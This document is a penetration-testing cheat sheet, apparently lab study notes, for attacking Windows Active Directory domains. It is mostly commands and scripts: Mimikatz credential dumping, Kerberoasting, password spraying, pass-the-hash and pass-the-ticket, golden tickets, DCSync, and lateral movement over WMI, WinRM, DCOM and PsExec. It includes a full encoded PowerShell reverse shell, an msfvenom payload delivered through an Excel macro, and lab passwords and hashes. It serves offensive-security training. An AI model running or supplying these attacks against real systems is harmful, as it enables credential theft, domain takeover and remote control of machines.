### Enumeration
```
net user
net user /domain
net user jeff_admin /domain
net group /domain
```

```
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
output:
Forest                  : corp.com
DomainControllers       : {DC01.corp.com}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : 
PdcRoleOwner(DC name)   : DC01.corp.com
RidRoleOwner            : DC01.corp.com
InfrastructureRoleOwner : DC01.corp.com
Name(domain name)       : corp.com
```

###### Collect all users along with their attributes,SPNs
```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"

$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

$objDomain = New-Object System.DirectoryServices.DirectoryEntry

$Searcher.SearchRoot = $objDomain

$Searcher.filter="samAccountType=805306368/name=Jeff_Admin/serviceprincipalname=*http*"

$Result = $Searcher.FindAll()

Foreach($obj in $Result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }
    
    Write-Host "------------------------"
}
```
###### Get all logon users and net sessions
https://github.com/KiritoLoveAsuna/Penetration-Testing/blob/main/powerview.ps1
```
Import-Module .\PowerView.ps1
Get-NetLoggedon -ComputerName client251
Get-NetSession -ComputerName dc01
```
###### Resolving Nested Groups
```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"

$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

$objDomain = New-Object System.DirectoryServices.DirectoryEntry

$Searcher.SearchRoot = $objDomain

$Searcher.filter="(objectClass=Group)" / $Searcher.filter="(name=Secret_Group)"

$Result = $Searcher.FindAll()

Foreach($obj in $Result)
{
    $obj.Properties.name / $obj.Properties.member
}
```
### Authentication
###### Minikatz(require local admin)
Load DemoEXE and run it locally.  
$PEBytes = [IO.File]::ReadAllBytes('DemoEXE.exe')  
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "Arg1 Arg2 Arg3 Arg4"
https://github.com/KiritoLoveAsuna/Penetration-Testing/blob/main/Invoke-ReflectivePEInjection.ps1
```
password hash:
1. privilege::debug
2. sekurlsa::logonpasswords
TGT and TGS:
1. sekurlsa::tickets
```
###### Service Account Attacks
https://github.com/KiritoLoveAsuna/Penetration-Testing/blob/main/Invoke-Kerberoast.ps1
```
Import-module .\Invoke-Kerberoast.ps1
Get-DomainSearcher -Domain testlab.local
Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation
hashcat64.exe -m 13100 hash.txt pass.txt --force
Get-DomainSearcher -Domain testlab.local -LDAPFilter '(samAccountType=805306368/serviceprincipalname=*http*)' -AdminCount -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation
```

```
kerberos::list == klist
sudo apt update && sudo apt install kerberoast
python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
```
###### Low and Slow Password Guessing
https://github.com/KiritoLoveAsuna/Penetration-Testing/blob/main/Spray-Passwords.ps1
```
net accounts
.\Spray-Passwords.ps1 -Pass 'Summer2016,Password123' -Admins -Verbose
.\Spray-Passwords.ps1 -File .\passwords.txt -Admins -Verbose
```

### Lateral Movement
/ticket - optional - filename for output the ticket - default is: ticket.kirbi.  
/ptt - no output in file, just inject the golden ticket in current session.
###### Get shell with clear password
```
impacket-psexec offsec.local/allison@192.168.151.59
```
###### Crackmapexec
```
rdp:
proxychains4 -f /etc/proxychains4.conf crackmapexec rdp 172.16.218.82 -u 'yoshi' -p 'Mushroom!'
proxychains4 -f /etc/proxychains4.conf crackmapexec smb 172.16.218.82 -u 'yoshi' -p 'Mushroom!' -M rdp -o ACTION='ENABLE’
proxychains4 -f /etc/proxychains4.conf xfreerdp /u:yoshi /d:medtech.com /p:Mushroom! /v:172.16.218.82 /cert-ignore


```
###### WMI(Remote Procedure Calls (RPC)2 over port 135)
```
Testing:
1. wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"

Reverse shell:
import sys
import base64
payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
print(cmd)

$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$Options = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
$Command = 'result of previous cmd variable value';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};

nc -lnvp 443
```
###### Winrm(domain user needs to be part of the Administrators or Remote Management Users group on the target host,5985,5986)
```
Testing:
winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"

Reverse shell:
CMD Version:
winrs -r:files04 -u:jen -p:Nexus123!  "result of previous cmd variable value"
nc -lnvp 443

Powershell Version:
$username = 'joe';
$password = 'Flowers1';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName 172.16.191.10 -Credential $credential
Enter-PSSession 1(id)
```
```
evil-winrm in kali

Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX] [-l]
    -S, --ssl                        Enable ssl
    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
    -r, --realm DOMAIN               Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -> CONTOSO.COM = { kdc = fooserver.contoso.com }
    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path
        --spn SPN_PREFIX             SPN prefix for Kerberos auth (default HTTP)
    -e, --executables EXES_PATH      C# executables local path
    -i, --ip IP                      Remote host IP or hostname. FQDN for Kerberos auth (required)
    -U, --url URL                    Remote url endpoint (default /wsman)
    -u, --user USER                  Username (required if not using kerberos)
    -p, --password PASS              Password
    -H, --hash HASH                  NTHash
    -P, --port PORT                  Remote host port (default 5985)
    -V, --version                    Show version
    -n, --no-colors                  Disable colors
    -N, --no-rpath-completion        Disable remote path completion
    -l, --log                        Log the WinRM session
    -h, --help                       Display this help message
```
###### Dump the local password hash and domain cached hash
```
/usr/share/doc/python3-impacket/examples/secretsdump.py offsec.local/Allison@192.168.176.59 -outputfile /home/kali/Desktop/admin_hash.txt
```
###### Pass the Hash(only for NTLM, Firewall allows SMB connection, Windows File and Print Sharing feature to be enabled)
```
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
/usr/share/doc/python3-impacket/examples/psexec.py OFFSEC.LOCAL/Administrator@192.168.176.57 -hashes "aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5"
/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
xfreerdp /u:<user> /d:<domain> /pth:<hash> /v:<ipAddr> /cert-ignore
```

###### Converted NTLM hash into a Kerberos TGT and leveraged that to gain remote code execution
https://learn.microsoft.com/en-us/sysinternals/downloads/psexec
```
sekurlsa::logonpasswords
sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
net use \\dc01(logon server)
klist
.\PsExec.exe \\dc01 or \\DC01/Allison cmd.exe
```
###### Pass the Ticket
```
whoami /user
kerberos::purge
kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668(domain SID part) /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327(password hash of the service account) /ptt
kerberos::list
sekurlsa::tickets /export (export all kirbi files)
kerberos::ptt [0;3e7]-0-0-40a00000-ted@krbtgt-web01.exam.com-exam.com.kirbi (load into memory)
Remote Code Execution: Invoke-WmiMethod win32_process -ComputerName $Computer -Credential $Creds -name create -argumentlist “$RunCommand”
```
###### Distributed Component Object Model
Require remote machine has office installed  
Require TCP 135 for DCOM and TCP 445 for SMB open
```
1. Check If Run Method and Workbooks Property exists
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))
$com | Get-Member
2. Create Payload
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f hta-psh -o evil.hta
3. Split payload
str = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQ....."
n = 50
for i in range(0, len(str), n):
	print "Str = Str + " + '"' + str[i:i+n] + '"'
4. Copy Splitted payload into created xls file's macro
Sub MyMacro()
    Dim Str As String
    ........
    Shell (Str)
End Sub
5. Run powershell file
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))
$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"
$RemotePath = "\\192.168.1.110\c$\myexcel.xls"
[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"
$temp = [system.io.directory]::createDirectory($Path)
$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
$com.Run("MyMacro")
```

###### Psexec
```
Requirements:
1. the user that authenticates to the target machine needs to be part of the Administrators local group
2. the ADMIN$ share must be available and File and Printer Sharing has to be turned on

./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
```
### Persistence
###### Golden Tickets(only if we can get password hash of a domain user account called krbtgt)
```
privilege::debug
lsadump::lsa /patch(get password hash)
kerberos::purge
kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668(domain SID part,from lsadump::lsa /patch) /krbtgt:75b60230a2394a812000dbfad8415965(from lsadump::lsa /patch) /ptt
misc::cmd(launch a new command prompt)
psexec.exe \\dc01 cmd.exe
```
###### Domain Controller SynchronizationZ
Require domain admin account
```
lsadump::dcsync /user:Administrator
```


